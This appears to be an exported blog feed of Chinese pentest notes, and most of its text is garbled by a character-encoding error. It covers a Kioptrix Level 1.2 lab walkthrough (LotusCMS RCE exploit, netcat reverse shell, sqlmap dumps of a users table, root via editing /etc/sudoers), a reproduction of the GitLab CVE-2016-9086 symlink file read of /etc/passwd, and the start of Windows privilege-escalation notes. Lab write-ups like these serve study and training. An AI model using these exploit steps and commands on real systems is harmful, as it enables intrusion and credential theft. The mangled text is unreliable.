MSFï¼Œä¸Šç½‘æŸ¥è¯¢æ˜¯å¦å­˜åœ¨å…¶ä»– exp ä»£ç ï¼Œå¥½å¥½å¥½~~è¿™ä¹ˆç©æ˜¯å§ï¼Œé‚£æˆ‘ç´§è·Ÿä½¬çš„æ­¥ä¼0.o è¿™æ˜¯ä½¬çš„æœç´¢æ–¹æ³• ![image-20230923200828274](kioptrix_level 1.2/image-20230923200828274.png) æˆ‘ä¹Ÿé™„ä¸Šexpé“¾æ¥ï¼šhttps://github.com/Hood3dRob1n/LotusCMS-Exploit 3.2 æ¼æ´åˆ©ç”¨ lotusCMS-RCE å°†å…¶ä¸‹è½½åˆ°æ”»å‡»æœºå¹¶èµ‹äºˆå¯æ‰§è¡Œæƒé™ï¼šè¿™é‡Œæˆ‘ç›´æ¥å°†zipæ‹–è¿›kaliäº† ![image-20230923201145279](kioptrix_level 1.2/image-20230923201145279.png) #!/bin/bash # Lotus CMS 3.0 eval() Remote Command Execition Exploit # flaw in router() function, original write-up: http://secunia.com/secunia_research/2011-21/ # Scripted in Bash by HR # USAGE: ./lotusRCE.sh target lotusCMS-path # USAGE: ./lotusRCE.sh ki0ptrix3.com / # USAGE: ./lotusRCE.sh 192.168.1.36 /lcms/ # Enter IP and PORT when asked to spawn netcat based reverse shell ;) #Start the magic target=\"$1\" #Target site, ex: 192.168.1.36 or ki0ptrix3.com (no http://) path=\"$2\" # Path to LotusCMS, ex: /lcms/ or / junk=/tmp storage1=$(mktemp -p \"$junk\" -t fooooobar1.tmp.XXX) storage2=$(mktemp -p \"$junk\" -t fooooobar2.tmp.XXX) æ­¤å¤„ä¸ºä»£ç çš„ç”¨æ³•ï¼Œå¯ä»¥çœ‹å‡ºæ˜¯è¦åå¼¹shellçš„ã€‚ å…ˆæ–°å»ºçª—å£å»ºç«‹èµ· nc ç›‘å¬ï¼šnc -lvnp 4444 ç„¶åè¿è¡Œ exp ä»£ç ï¼š./lotusRCE.sh kioptrix3.com / è¿è¡ŒåæŒ‰æç¤ºè¾“å…¥ç”¨äºæ¥æ”¶åå¼¹ shell çš„ IP å’Œç«¯å£ï¼Œå¹¶é€‰æ‹©åå¼¹æ–¹å¼ï¼š ![image-20230923201445552](kioptrix_level 1.2/image-20230923201445552.png) ![image-20230923201609119](kioptrix_level 1.2/image-20230923201609119.png) é€‰æ‹©åå¼¹æ–¹å¼ 1 ä¹‹åï¼Œnc æ”¶åˆ°åå¼¹ shellï¼Œæƒé™ä¸º www-dataï¼š ![image-20230923201646856](kioptrix_level 1.2/image-20230923201646856.png) ä½¿ç”¨ Python å»ºç«‹ TTY Shellï¼špython -c 'import pty;pty.spawn(\"/bin/bash\");' ç¿»ä¸€ä¸‹ç›®å½•å°è¯•æœé›†æœ‰æ•ˆä¿¡æ¯ï¼Œåœ¨å½“å‰ä½ç½®ä¸‹çš„ /gallery æ–‡ä»¶å¤¹ä¸‹å‘ç°å­˜åœ¨ç–‘ä¼¼é…ç½®æ–‡ä»¶ gconfig.phpï¼š ![image-20230923201913897](kioptrix_level 1.2/image-20230923201913897.png) è¯»å–çœ‹ä¸€ä¸‹ï¼Œå‘ç°å­˜åœ¨æ•°æ®åº“çš„é…ç½®ä¿¡æ¯ ![image-20230923202004834](kioptrix_level 1.2/image-20230923202004834.png) $GLOBALS[\"gallarific_mysql_server\"] = \"localhost\"; $GLOBALS[\"gallarific_mysql_database\"] = \"gallery\"; $GLOBALS[\"gallarific_mysql_username\"] = \"root\"; $GLOBALS[\"gallarific_mysql_password\"] = \"fuckeyou\"; å­˜ä¸€ä¸‹ï¼Œæ¥ç€æƒ³åˆ°äº†phpmyadminï¼Œæˆ‘ä»¬ç™»é™†çœ‹çœ‹ï¼Œè¿™é‡Œä¹Ÿæ˜¯éœ‡æƒŠäº†ï¼Œä¹‹å‰æˆ‘åªç”¨ adminç™»å½•ï¼Œç°åœ¨ç”¨ä¸Šè¿°ç»™çš„è´¦å·å¯†ç ç™»å½•ï¼Œé¡µé¢å›æ˜¾ç«Ÿç„¶ä¸ä¸€æ ·ã€‚ã€‚ã€‚ sshç™»å½•ç”¨æˆ· ![image-20230923202247609](kioptrix_level 1.2/image-20230923202247609.png) æ¥ç€å‘ç°äº†ä¸¤å¤„ç”¨æˆ·ä¿¡æ¯ dev_accounts è¡¨ä¸­çš„ç”¨æˆ·ä¿¡æ¯ï¼š dreg 0d3eccfb887aabd50f243b3f155c0f85 loneferret 5badcaf789d3d1d09794d8f021f40f0e gallarific_usersè¡¨ä¸­çš„ä¿¡æ¯ï¼š admin n0t7t1k4 superuser è¿™é‡Œç”¨md5è§£å¯†çœ‹çœ‹ï¼Œä¸Šè¿°devè¡¨è§£å¯†çš„ä¿¡æ¯ä¸ºï¼š Mast3r ä¸ starwars æ¥ç€å‰å¾€ä¹‹å‰çš„ç™»å½•é¡µé¢çœ‹çœ‹ï¼Œå‘ç°ä¸Šè¿°ä¸‰ä¸ªéƒ½ç™»å½•ä¸ä¸Šï¼Œæ¥ç€wpè¯´ æ¢ ssh ç™»å½•ï¼Œdregã€loneferret å¯æˆåŠŸç™»å½•ã€‚ è¿™é‡Œdregç”¨æˆ·æ²¡æœ‰ä¿¡æ¯ï¼Œç™»å½•å¦ä¸€ä¸ªå³å¯ã€‚ æ¥ç€ä½¬åˆå¼€å§‹æ¼æ´æŒ–æ˜äº†ï¼Œè®¿é—® http://kioptrix3.com/gallery/ è¿›è¡Œæ¼æ´æŒ–æ˜ï¼š ![image-20230923203825517](kioptrix_level 1.2/image-20230923203825517.png) å¦‚å›¾æˆ‘å‘ç°ç‚¹å‡»æ¯ä¸ªé“¾æ¥ï¼Œé¡µé¢éƒ½ä¼šå›æ˜¾ä¸€äº›18ç¦çš„å†…å®¹ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚æˆ‘çœŸè¢«éœ‡æƒŠåˆ°äº†ï¼Œä¼°è®¡æ˜¯é¢˜ç›®ç°åœ¨å‡ºé—®é¢˜äº†ï¼Ÿï¼Œäºæ˜¯æˆ‘è¿˜æ˜¯ç›´æ¥è®¿é—®ç­”æ¡ˆå§ã€‚ ç‚¹å‡»é¡µé¢ Ligoat Press Room è¿›å…¥æ–°é¡µé¢ï¼Œå·¦ä¸‹è§’æœ‰æ’åºé€‰é¡¹æ¡†ï¼Œä»»é€‰ä¹‹åå‘ç° url å‡ºç°äº† id å‚æ•°ï¼šï¼ˆä½†æˆ‘æ ¹æœ¬ç‚¹ä¸äº†ï¼‰ ![image-20230923204011375](kioptrix_level 1.2/image-20230923204011375.png) å°†æ­¤ url ä¸¢åˆ° sqlmap è¿›è¡Œæµ‹è¯•ï¼š sqlmap -u \"http://kioptrix3.com/gallery/gallery.php?id=1\" ![image-20230923204344017](kioptrix_level 1.2/image-20230923204344017.png) å¦‚å›¾å‘ç°å­˜åœ¨sqlæ³¨å…¥ï¼Œæ¥ç€çˆ†æ•°æ®åº“ï¼Œè¡¨åç­‰ç­‰ï¼Œä¸è¿‡çŒœæµ‹çˆ†å‡ºæ¥çš„å°±æ˜¯åˆšåˆšRCEå¾—åˆ°çš„ åˆ©ç”¨sqlmapå¾—åˆ°æ•°æ®åº“åï¼šsqlmap -u \"http://kioptrix3.com/gallery/gallery.php?id=1\" --dbs sqlmap -u \"http://kioptrix3.com/gallery/gallery.php?id=1\" -D gallery --tables --batch sqlmap -u \"http://kioptrix3.com/gallery/gallery.php?id=1\" -D gallery -T dev_accounts --columns --batch sqlmap -u \"http://kioptrix3.com/gallery/gallery.php?id=1\" -D gallery -T dev_accounts -C username,password --dump --batch ![image-20230923204513242](kioptrix_level 1.2/image-20230923204513242.png) ![image-20230923204602653](kioptrix_level 1.2/image-20230923204602653.png) ![image-20230923204728931](kioptrix_level 1.2/image-20230923204728931.png) æœ€ç»ˆå¾—åˆ°ç”¨æˆ·åå’Œå¯†ç  sudoæƒé™æå‡ æŸ¥çœ‹ loneferret ç”¨æˆ·ï¼Œå®¶ç›®å½•ä¸‹å­˜åœ¨ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¯æ‰§è¡Œè„šæœ¬ checksec.sh æ˜¯é€†å‘ä¸­ç”¨äºæ£€æµ‹ç›®æ ‡æ–‡ä»¶ä½¿ç”¨äº†å“ªäº›é˜²æŠ¤æŠ€æœ¯çš„ï¼Œåœ¨ CompanyPolicy.README æ–‡ä»¶ä¸­æ‰¾åˆ°æç¤ºä¿¡æ¯ï¼Œè¦è¿è¡Œå‘½ä»¤ï¼šsudo ht è¿™é‡Œæˆ‘é‡‡ç”¨çš„finalshellè¿æ¥sshï¼Œä½¬æ˜¯ç”¨kaliçš„ ht ç¼–è¾‘å™¨ä½¿ç”¨è¯´æ˜ï¼šhttps://www.aldeid.com/wiki/HT-Editor æŒ‰ F3 è°ƒå‡ºæ–‡ä»¶çª—å£ï¼Œè¾“å…¥ /etc/sudoers å›è½¦è¿›è¡Œç¼–è¾‘ï¼š ![image-20230923205039949](kioptrix_level 1.2/image-20230923205039949.png) ä¸è¿‡è¿™ä¼¼ä¹ä¸å¾—ä¸kaliäº†ï¼Œä¸è¿‡è®©æˆ‘å´©æºƒçš„æ˜¯kaliçš„sshåŠŸèƒ½ç«Ÿç„¶æŠ¥é”™ï¼Œä¿¡æ¯å¦‚ä¸‹ Unable to negotiate with 192.168.17.143 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss æœå¯»ä¸€ç•ªå‘ç°æ­¤æ–‡ç« æˆ–è®¸å¯ä»¥è§£å†³ï¼š[SSH è¿”å›ï¼šæœªæ‰¾åˆ°åŒ¹é…çš„ä¸»æœºå¯†é’¥ç±»å‹ã€‚ä»–ä»¬çš„æŠ¥ä»·ï¼šssh-dss ![image-20230923211220504](kioptrix_level 1.2/image-20230923211220504.png)æˆåŠŸé“¾æ¥ï¼Œæ¥ç€sudo ht ![image-20230923211256972](kioptrix_level 1.2/image-20230923211256972.png) ä½†å´æŠ¥é”™äº†ï¼Œä¿¡å·è¿™ä½ä½¬ä¹Ÿè·Ÿæˆ‘ä¸€æ ·ï¼š è¿è¡Œå‡ºç°æŠ¥é”™æç¤ºï¼šError opening terminal: xterm-256color. æŸ¥è¯¢æ˜¯æ–°ç‰ˆ kali çš„ç»ˆç«¯é…è‰²è¿‡äºå…ˆè¿›ï¼Œé™çº§ä¸€ä¸‹ï¼šexport TERM=xterm-color éªŒè¯ä¸€ä¸‹ sudo æƒé™ï¼š ![image-20230923211513202](kioptrix_level 1.2/image-20230923211513202.png) å‘ç° su å’Œ ht å…·æœ‰ root æƒé™ï¼Œå°è¯•è¿è¡Œ su å‘½ä»¤å¤±è´¥ï¼Œæ— æ³•ç›´æ¥åˆ‡æ¢è‡³ root ç”¨æˆ·ã€‚ å†æ¬¡è¿è¡Œï¼šsudo ht ![image-20230923211416068](kioptrix_level 1.2/image-20230923211416068.png) ht ç¼–è¾‘å™¨ä½¿ç”¨è¯´æ˜ï¼šhttps://www.aldeid.com/wiki/HT-Editor æŒ‰ F3 è°ƒå‡ºæ–‡ä»¶çª—å£ï¼Œè¾“å…¥ /etc/sudoers å›è½¦è¿›è¡Œç¼–è¾‘ï¼š ![image-20230923211552544](kioptrix_level 1.2/image-20230923211552544.png) å°†åŸæœ‰ loneferret æ¡ç›®ä¿®æ”¹ä¸ºï¼šloneferret ALL=(ALL) ALL ![image-20230923211709870](kioptrix_level 1.2/image-20230923211709870.png) ä¿®æ”¹å®Œæ¯•æŒ‰ F2 ä¿å­˜ï¼Œç„¶åæŒ‰ F10 é€€å‡ºï¼Œå›åˆ°ç»ˆç«¯åè¿è¡Œå‘½ä»¤ï¼šsudo su -ï¼ˆè¾“å…¥ loneferret å¯†ç  starwarsï¼‰ ![image-20230923211824238](kioptrix_level 1.2/image-20230923211824238.png) æˆåŠŸè·å–rootæƒé™ï¼Œåœ¨è¯¥ç›®å½•ä¸‹æ‰¾flagå³å¯ ![image-20230923212349728](kioptrix_level 1.2/image-20230923212349728.png) ä½†æ²¡æƒ³åˆ°è¿™å°±æ˜¯ flagï¼Œemmm 0x04 æ€»ç»“ å›é¡¾ä¸€ä¸‹æ­¤æ¬¡æ¸—é€è·¯ç¨‹ï¼šè¿›åˆ°å†…ç½‘ä¹‹åï¼Œé¦–å…ˆå°±æ˜¯æ‰«æä¸»æœºå­˜æ´»ï¼Œéšåé’ˆå¯¹æŸä¸ªä¸»æœºå±•å¼€æ¸—é€ï¼Œç„¶åå‘¢å…ˆè¿›è¡Œç®€å•å´å…³é”®çš„ä¿¡æ¯æœé›†ï¼Œå¦‚ç«¯å£æ‰«æï¼Œæ‰¾åˆ°å¯ä»¥ç«¯å£ä¾¿å¯ä»¥æ‰«ä¸€ä¸‹webç½‘ç«™çš„ç›®å½•ï¼Œçœ‹çœ‹ç½‘ç«™ä¸­ä¼šå­˜åœ¨å“ªäº›å¸¸è§æ¼æ´ã€‚ å½“ç„¶åœ¨æ­¤æœŸé—´ä¹Ÿè¦å¯¹webç½‘ç«™åšå¥½ä¿¡æ¯æœé›†ï¼Œæ¯”å¦‚ç”¨çš„ä»€ä¹ˆä¸­é—´ä»¶ï¼Œé‡‡ç”¨çš„ä½•ç§CMSç­‰ç­‰ï¼Œæ›´è¦å­¦ä¼šåœ¨æœé›†åˆ°å¯ç–‘ä¿¡æ¯åï¼Œå¯ç–‘åœ¨ç™¾åº¦ï¼Œgoogleï¼Œgihubç­‰å¤„æ‰¾åˆ°åˆé€‚çš„expç­‰æ¼æ´åˆ©ç”¨æ‰‹æ®µã€‚ æ‰¾åˆ°ä¹‹åæ— éå°±æ˜¯æƒ³è¦è·å–ä¸€äº›é‡è¦æ•°æ®ï¼Œæ¯”å¦‚è´¦å·å¯†ç ä¹‹ç±»çš„ï¼Œè¿™ä¼šæˆä¸ºåç»­sshè¿æ¥çš„é‡è¦æ‰‹æ®µã€‚ å½“æˆ‘ä»¬æˆåŠŸè·å–é¶æœºshellæ—¶ï¼Œè‚¯å®šå°±æ˜¯è¦æƒ³åŠæ³•ææƒï¼Œå› ä¸ºä¸å¯èƒ½è¿æ°”çˆ†æ£šç›´æ¥å°±æ˜¯æœ€é«˜æƒé™ï¼Œè€Œæˆ‘ä»¬æ¸—é€çš„æœ€ç»ˆç›®çš„å°±æ˜¯æ‹¿ä¸‹é¶æœºçš„æœ€é«˜æƒé™ã€‚åœ¨æ­¤æœŸé—´å¯èƒ½å°±è¦å……è¶³çš„æŠ€æœ¯å»çŸ¥é“åˆ©ç”¨ä½•ç§æŠ€æœ¯å»ææƒï¼Œåšå…æ€ç­‰ç­‰ã€‚ æ­¤æ¬¡æ¸—é€æ—…ç¨‹è®©æˆ‘å—ç›Šé¢‡ä¸°ï¼Œå†æ¥å†å‰ï¼Œå¸Œæœ›æ—¥åå¯ä»¥é è‡ªå·±çš„è„‘å­ï¼Œèµ°çš„æ›´è¿œã€‚ ä¸è¿‡è¯åˆè¯´å›æ¥äº†ï¼Œæˆ‘å¾—å»å­¦ä¸€ä¸‹sudoææƒäº†ï¼Œæ„Ÿè§‰åœ¨æ­¤å¤„çš„ç†è§£ä¸å¤Ÿæ·±åˆ»ã€‚æˆ‘ä»¬æ¢ä¸€ç¯‡æ–‡ç« æ¢è®¨ï¼ 0x05 å‚è€ƒæ–‡ç«  VulnHubæ¸—é€æµ‹è¯•å®æˆ˜é¶åœº - KIOPTRIX: LEVEL 1.2 [vulnhubé¶åœºKioptrix: Level 1.2 (#3) ] Kioptrix: Level 1.2","tags":["å†…ç½‘é¶åœº"],"categories":["vulnhubç³»åˆ—"]},{"title":"Gitlab ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆCVE-2016-9086ï¼‰","path":"/2023/09/20/gitlab-ren-yi-wen-jian-du-qu-lou-dong-cve-2016-9086/","content":"0x01 æ¼æ´æ¦‚è¿° GitLab æ˜¯ä¸€ä¸ªåˆ©ç”¨ Ruby on Rails å¼€å‘çš„å¼€æºåº”ç”¨ç¨‹åºï¼Œå®ç°ä¸€ä¸ªè‡ªæ‰˜ç®¡çš„ Git é¡¹ç›®ä»“åº“ï¼Œå¯é€šè¿‡ Web ç•Œé¢è¿›è¡Œè®¿é—®å…¬å¼€çš„æˆ–è€…ç§äººé¡¹ç›®ã€‚è¿‘æ—¥ç ”ç©¶è€…å‘ç°åœ¨å…¶å¤šä¸ªç‰ˆæœ¬ä¸­å­˜åœ¨æ–‡ä»¶è¯»å–æ¼æ´ (CVE-2016-9086) å’Œ ä»»æ„ç”¨æˆ· authentication_token æ³„æ¼æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¿™ä¸¤ä¸ªæ¼æ´æ¥è·å–ç®¡ç†å‘˜çš„æƒé™ï¼Œè¿›è€Œæ§åˆ¶æ‰€æœ‰ gitlab é¡¹ç›®ã€‚ å½±å“ç‰ˆæœ¬ï¼š **ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ (CVE-2016-9086)ï¼š**GitLab CE/EEversions 8.9, 8.10, 8.11, 8.12, and 8.13 **ä»»æ„ç”¨æˆ· authentication_token æ³„éœ²æ¼æ´ï¼š**Gitlab CE/EE versions 8.10.3-8.10.5 0x02 æ¼æ´åˆ†æ è¿™é‡Œè·Ÿç€ä½¬çš„æ€è·¯èµ°ä¸€æ¬¡ï¼Œææ¸…æ¼æ´å‘ç”ŸåŸå› å³å¯ ä» 8.9.0 ç‰ˆæœ¬å¼€å§‹ï¼ŒGitLab æ–°å¢äº†å¯¼å…¥å¯¼å‡ºé¡¹ç›®çš„åŠŸèƒ½ã€‚ä¸€ä¸ªç©ºçš„ gitlab é¡¹ç›®å¯¼å‡ºåç»“æ„å¦‚ä¸‹ï¼š VERSION # GitLab çš„å¯¼å‡ºæ¨¡å—çš„ç‰ˆæœ¬ project.json # åŒ…å«äº†é¡¹ç›®çš„é…ç½®æ–‡ä»¶ å½“æˆ‘ä»¬å¯¼å…¥ GitLab çš„å¯¼å‡ºæ–‡ä»¶çš„æ—¶å€™ï¼ŒGitLab ä¼šæŒ‰ç…§å¦‚ä¸‹æ­¥éª¤å¤„ç†ï¼š æœåŠ¡å™¨æ ¹æ® VERSION æ–‡ä»¶å†…å®¹æ£€æµ‹å¯¼å‡ºæ–‡ä»¶ç‰ˆæœ¬ï¼Œå¦‚æœç‰ˆæœ¬ç¬¦åˆï¼Œåˆ™å¯¼å…¥ã€‚ æœåŠ¡å™¨æ ¹æ® Project.json æ–‡ä»¶åˆ›å»ºä¸€ä¸ªæ–°çš„é¡¹ç›®ï¼Œå¹¶å°†å¯¹åº”çš„é¡¹ç›®æ–‡ä»¶æ‹·è´åˆ°æœåŠ¡å™¨ä¸Šå¯¹åº”çš„ä½ç½®ã€‚ æ£€æµ‹ VERSION æ–‡ä»¶çš„ä»£ç ä½äºï¼š/lib/gitlab/import_export/version_checker.rbä¸­ï¼š ... def check! version = File.open(version_file, &amp;:readline) #versionå˜é‡å°†åŒ…å«æ–‡ä»¶çš„ç¬¬ä¸€è¡Œå†…å®¹ã€‚ verify_version!(version) rescue =&gt; e shared.error(e) false end ... def verify_version!(version) if Gem::Version.new(version) != Gem::Version.new(Gitlab::ImportExport.version) raise Gitlab::ImportExport::Error.new(\"Import version mismatch: Required #{Gitlab::ImportExport.version} but was #{version}\") else true end end ... â€‹ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„é€»è¾‘æ˜¯è¯»å– VERSION æ–‡ä»¶çš„ç¬¬ä¸€è¡Œèµ‹å€¼ç»™å˜é‡ versionï¼Œç„¶åæ£€æµ‹ verison ä¸å½“å‰ç‰ˆæœ¬æ˜¯å¦ç›¸åŒï¼Œç›¸åŒè¿”å› trueï¼Œä¸ç›¸åŒåˆ™è¿”å›é”™è¯¯ä¿¡æ¯ (é”™è¯¯ä¿¡æ¯ä¸­åŒ…æ‹¬å˜é‡ version çš„å€¼). äºæ˜¯æ¼æ´å‘ç°è€… Jobert Abma å·§å¦™çš„ä½¿ç”¨äº†è½¯é“¾æ¥æ¥è¾¾åˆ°è¯»å–ä»»æ„æ–‡ä»¶çš„ç›®çš„ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬ç»™ VERSION æ–‡ä»¶åŠ ä¸Šè½¯é“¾æ¥å¹¶é‡æ–°æ‰“åŒ…ã€‚ ln -sf /etc/passwd VERSION tar zcf change_version.tar.gz ./ lnï¼šè¿™æ˜¯åˆ›å»ºé“¾æ¥çš„å‘½ä»¤ã€‚ -sfï¼šè¿™æ˜¯lnå‘½ä»¤çš„é€‰é¡¹ï¼š -s è¡¨ç¤ºåˆ›å»ºç¬¦å·é“¾æ¥ï¼Œå³è½¯é“¾æ¥ã€‚ -f è¡¨ç¤ºå¦‚æœå·²å­˜åœ¨åä¸ºVERSIONçš„é“¾æ¥æ–‡ä»¶ï¼Œåˆ™å¼ºåˆ¶è¦†ç›–å®ƒï¼Œå³ä½¿å®ƒå·²ç»å­˜åœ¨ã€‚ /etc/passwdï¼šè¿™æ˜¯æºæ–‡ä»¶çš„è·¯å¾„ï¼Œå³è¦åˆ›å»ºè½¯é“¾æ¥çš„ç›®æ ‡æ–‡ä»¶æ˜¯/etc/passwdã€‚ VERSIONï¼šè¿™æ˜¯è¦åˆ›å»ºçš„è½¯é“¾æ¥çš„åç§°ï¼Œå®ƒå°†é“¾æ¥åˆ°/etc/passwdæ–‡ä»¶ã€‚ è¿™æ ·ï¼Œè¯»å– VERSION æ–‡ä»¶çš„æ—¶å€™æœåŠ¡å™¨å°±ä¼šæ ¹æ®è½¯é“¾æ¥è¯»å–åˆ° /etc/passwd çš„ç¬¬ä¸€è¡Œå†…å®¹å¹¶èµ‹å€¼ç»™ versionã€‚ä½†æ˜¯ç”±äº version ä¸å½“å‰ç‰ˆæœ¬ä¸ç›¸åŒï¼Œæ‰€ä»¥ä¼šè¾“å‡º version çš„å€¼ï¼Œä¹Ÿå°±æ˜¯ /etc/passwd ç¬¬ä¸€è¡Œçš„å†…å®¹ã€‚ **ä½†æ˜¯ï¼Œå¦‚æœåªè¯»å–ä»»æ„æ–‡ä»¶çš„ç¬¬ä¸€è¡Œï¼Œèƒ½åšçš„äº‹æƒ…è¿˜æ˜¯å¤ªå°‘äº†ã€‚æ¼æ´å‘ç°è€…æ˜¾ç„¶ä¸æ»¡è¶³è¿™ä¸€ç»“æœï¼Œä»–ç»§ç»­æ‰¾äº†ä¸‹å».**è¯»å– Project.json è¿™ä¸€é…ç½®æ–‡ä»¶çš„ä»£ç ä½äºï¼š/lib/gitlab/import_export/project_tree_restorer.rb ä¸­ï¼š ... def restore json = IO.read(@path) tree_hash = ActiveSupport::JSON.decode(json) project_members = tree_hash.delete('project_members') ActiveRecord::Base.no_touching do create_relations end rescue =&gt; e shared.error(e) false end ... åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥å†æ¬¡ä½¿ç”¨è½¯é“¾æ¥ä½¿å˜é‡ json è·å–åˆ°ä»»æ„æ–‡ä»¶çš„å†…å®¹ï¼Œä½†æ˜¯ç”±äºè·å–çš„æ–‡ä»¶ä¸æ˜¯ json æ ¼å¼ï¼Œæ— æ³• decodeï¼Œå¯¼è‡´å¼‚å¸¸æŠ›å‡ºï¼Œæœ€ç»ˆåœ¨å‰ç«¯æ˜¾ç¤ºå‡ºä»»æ„æ–‡ä»¶çš„å†…å®¹ã€‚ æ·»åŠ è½¯é“¾æ¥å¹¶æ‰“åŒ…: ln -sf /etc/passwd project.json tar zcf change_version.tar.gz ./ ä½¬çš„æ€è·¯å°±æ˜¯å®Œç¾ 0x03 æ¼æ´å¤ç° dockerä¸€é”®éƒ¨ç½²åè®¿é—®8080ç«¯å£ï¼Œç¯å¢ƒè¿è¡Œï¼Œssh ç«¯å£ä¸º 10022ã€‚è®¿é—® http://your-ip:8080ï¼Œè®¾ç½®ç®¡ç†å‘˜ï¼ˆç”¨æˆ·å rootï¼‰å¯†ç ï¼Œç™»å½•ã€‚ é»˜è®¤ç®¡ç†å‘˜å¸æˆ·çš„å‡­æ®ä¸ºrootå’Œvulhub123456ã€‚ ![image-20230920204243371](Gitlab ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆCVE-2016-9086ï¼‰/image-20230920204243371.png) è¿™é‡Œæ–°æ³¨å†Œä¸€ä¸ªç”¨æˆ·å¹¶ç™»å½•ï¼Œè¿›å…¥è¯¥é¡µé¢åç‚¹å‡»å³ä¸Šè§’çš„+å· ![image-20230920204911687](Gitlab ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆCVE-2016-9086ï¼‰/image-20230920204911687.png) æ–°å»ºä¸€ä¸ªé¡¹ç›®ï¼Œç‚¹å‡» GitLab exportï¼š ![image-20230920204940165](Gitlab ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆCVE-2016-9086ï¼‰/image-20230920204940165.png) ä¸Šä¼ æ–‡ä»¶test.tar.gzï¼Œæ–‡ä»¶/etc/passwdå†…å®¹ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼š ![image-20230920205141629](Gitlab ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆCVE-2016-9086ï¼‰/image-20230920205141629.png) ![image-20230920205157712](Gitlab ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆCVE-2016-9086ï¼‰/image-20230920205157712.png) 0x04 æ¼æ´ä¿®å¤ å®˜æ–¹å…ˆç§»é™¤äº†å¯¼å…¥åŒ…é‡Œçš„è½¯è¿æ¥ï¼Œå…¶æ¬¡ï¼Œè¯»å– VERSION çš„å†…å®¹å’Œ project.json çš„å†…å®¹å‡ºé”™åå°†å†…å®¹è¾“å‡ºåˆ°æ—¥å¿—é‡Œè€Œéè¿”å›åˆ°å‰ç«¯ã€‚ å…·ä½“å¯ä»¥å‚è€ƒä¸€ä¸‹æ–‡ç« ã€‚ 0x05 å‚è€ƒæ–‡ç«  Gitlab ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¤ç° GitLab ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ (CVE-2016-9086) å’Œä»»æ„ç”¨æˆ· token æ³„éœ²æ¼æ´ GitLab ä»»æ„æ–‡ä»¶æ³„éœ² (CVE-2016-9086)","tags":["CVE"],"categories":["CVEæ¼æ´"]},{"title":"Windowsææƒå­¦ä¹ ä¸€","path":"/2023/09/19/windows-ti-quan-xue-xi-yi/","content":"0x01 åŸºç¡€çŸ¥è¯† ææƒçš„æ€è·¯æœ€é‡è¦çš„å°±æ˜¯ä¿¡æ¯æ”¶é›†,æˆ‘ä»¬åªæœ‰å¯¹æ•´ä¸ªç³»ç»Ÿè¿›è¡Œäº†è¾ƒå…¨é¢çš„ä¿¡æ¯æ”¶é›†,å¤§æ¦‚å¯¹æ•´ä¸ªç³»ç»Ÿæœ‰äº†ä¸€å®šçš„äº†è§£å,æˆ‘ä»¬æ‰èƒ½é«˜æ•ˆä¸”ç²¾å‡†çš„å®Œæˆææƒ æ¯”æ–¹è¯´:æˆ‘ä»¬æ”¶é›†åˆ°è¿™ä¸ªç³»ç»Ÿæ˜¯windows-sever2003çš„ç³»ç»Ÿå’Œé‡Œé¢çš„ä¸€äº›ç›¸å…³é…ç½®æˆ‘ä»¬èƒ½è”æƒ³åˆ°ä»€ä¹ˆææƒæ–¹æ³•å‘¢? æ˜¯ä¸æ˜¯å¯ä»¥å…ˆåˆ©ç”¨è‡ªåŠ¨åŒ–å·¥å…·(msfå’Œcs)å…ˆå»å°è¯•â€“&gt;é’ˆå¯¹ä½ç‰ˆæœ¬çš„ç³»ç»Ÿå‘½ä»¤â€“&gt;è¿›ç¨‹è¿ç§»â€“&gt;ä»¤ç‰Œçªƒå–â€“&gt;dllåŠ«æŒâ€“&gt;ä¸å®‰å…¨çš„æœåŠ¡â€“&gt;æ‰‹å·¥ææƒè¿™ä¹ˆä¸€ä¸ªæµç¨‹ 1.1 ææƒåŸºç¡€å‘½ä»¤ # æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯ systeminfo # å¦‚æœè¦æŸ¥çœ‹ç‰¹å®šçš„ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨ systeminfo | findstr /B /C:\"OSåç§°\" /C:\"OSç‰ˆæœ¬\" # ä¸»æœºå Hostname # ç¯å¢ƒå˜é‡ Set # æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯ Net user # æŸ¥çœ‹æœåŠ¡ pid å· tasklist /svc|find \"TermService\" netstat -ano|find \"3389\" # æŸ¥çœ‹ç³»ç»Ÿå wmic os get caption # æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯ wmic qfe get Description,HotFixID,InstalledOn # å¦‚æœè¦å®šä½åˆ°ç‰¹å®šçš„è¡¥ä¸å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ wmic qfe get Description,HotFixID,InstalledOn | findstr /C:\"KB4346084\" /C:\"KB4509094\" # æŸ¥çœ‹å½“å‰å®‰è£…ç¨‹åº wmic product get name,version å…¶ä¸­éœ€è¦æ³¨æ„ä¸€ä¸‹ ç¯å¢ƒå˜é‡ï¼Œå› ä¸ºæœ‰çš„è½¯ä»¶ç¯å¢ƒå˜é‡å¯èƒ½è®¾ç½®åœ¨å…¶å®ƒè·¯å¾„ä¸­ï¼Œè€Œåœ¨è¯¥è·¯å¾„ä¸‹çš„æ–‡ä»¶æ˜¯å…·æœ‰å†™æƒé™çš„ï¼Œå°±å¯ä»¥é€šè¿‡æ›¿æ¢æ–‡ä»¶æ¥è¾¾åˆ°ææƒæ“ä½œ è¿™é‡Œçš„å‘½ä»¤åœ¨windowsä¿¡æ¯æœé›†éƒ½æœ‰çš„ 1.2 Windows æƒé™åˆ’åˆ† 